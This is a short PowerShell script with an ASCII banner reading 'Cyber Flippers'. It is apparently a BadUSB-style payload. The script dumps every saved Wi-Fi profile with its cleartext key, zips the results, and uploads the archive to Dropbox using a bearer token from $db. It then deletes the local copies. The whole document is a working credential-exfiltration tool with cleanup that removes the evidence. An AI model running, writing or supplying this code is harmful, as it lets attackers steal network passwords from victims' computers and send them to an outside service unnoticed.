<#
########################################################################################################################
#  __  __ _____      ______ _      _____ _____  _____  ______ _____  __  __ ______ _   _ 			      #
# |  \/  |  __ \    |  ____| |    |_   _|  __ \|  __ \|  ____|  __ \|  \/  |  ____| \ | |			      #
# | \  / | |__) |   | |__  | |      | | | |__) | |__) | |__  | |__) | \  / | |__  |  \| |			      #
# | |\/| |  _  /    |  __| | |      | | |  ___/|  ___/|  __| |  _  /| |\/| |  __| |     |			      #
# | |  | | | \ \ _  | |    | |____ _| |_| |    | |    | |____| | \ \| |  | | |____| |\  |			      #
# |_|  |_|_|  \_(_) |_|    |______|_____|_|    |_|    |______|_|  \_\_|  |_|______|_| \_|                             #
#    _______     ______  ______ _____  ______ _      _____ _____  _____  ______ _____   _____ 			      # 
#   / ____\ \   / /  _ \|  ____|  __ \|  ____| |    |_   _|  __ \|  __ \|  ____|  __ \ / ____|                        # 
#  | |     \ \_/ /| |_) | |__  | |__) | |__  | |      | | | |__) | |__) | |__  | |__) | (___                          # 
#  | |      \   / |  _ <|  __| |  _  /|  __| | |      | | |  ___/|  ___/|  __| |  _  / \___ \                         # 
#  | |____   | |  | |_) | |____| | \ \| |    | |____ _| |_| |    | |    | |____| | \ \ ____) |                        # 
#   \_____|  |_|  |____/|______|_|  \_\_|    |______|_____|_|    |_|    |______|_|  \_\_____/ 			      # 
 #########################################################################################################################           
#>
function Export-WiFiKeys {
    # Crear directorio con fecha y hora actual
    $folderDateTime = (Get-Date).ToString('yyyy-MM-dd_HH-mm-ss')
    $userDir = "$env:USERPROFILE\Documents\Networks_$folderDateTime"
    New-Item -Path $userDir -ItemType Directory

    # Recoger contraseñas de WiFi
    netsh wlan show profiles | ForEach-Object {
        $profileName = ($_ -split ':')[1].Trim()
        $details = netsh wlan show profile name="$profileName" key=clear
        $details | Out-File -FilePath "$userDir\$profileName.txt"
    }

    # Comprimir y preparar para subida
    Compress-Archive -Path $userDir -DestinationPath "$userDir.zip"
    $file = "$userDir.zip"
    $dropboxUploadPath = "/Networks_$folderDateTime.zip"

    # Definir la función para subir a Dropbox
    function DropBox-Upload {
        [CmdletBinding()]
        param (
            [Parameter (Mandatory = $True, ValueFromPipeline = $True)]
            [Alias("f")]
            [string]$SourceFilePath
        ) 
        $outputFile = Split-Path $SourceFilePath -leaf
        $TargetFilePath="/$outputFile"
        $arg = '{ "path": "' + $TargetFilePath + '", "mode": "add", "autorename": true, "mute": false }'
        $authorization = "Bearer " + $db
        $headers = New-Object "System.Collections.Generic.Dictionary[[String],[String]]"
        $headers.Add("Authorization", $authorization)
        $headers.Add("Dropbox-API-Arg", $arg)
        $headers.Add("Content-Type", 'application/octet-stream')
        Invoke-RestMethod -Uri https://content.dropboxapi.com/2/files/upload -Method Post -InFile $SourceFilePath -Headers $headers
    }

    # Subida a Dropbox
    if (-not ([string]::IsNullOrEmpty($db))) {
        DropBox-Upload -SourceFilePath $file
    }

    # Limpieza
    Remove-Item -Path $userDir -Recurse
    Remove-Item -Path $file
}

# Llama la función para ejecutar el proceso
Export-WiFiKeys
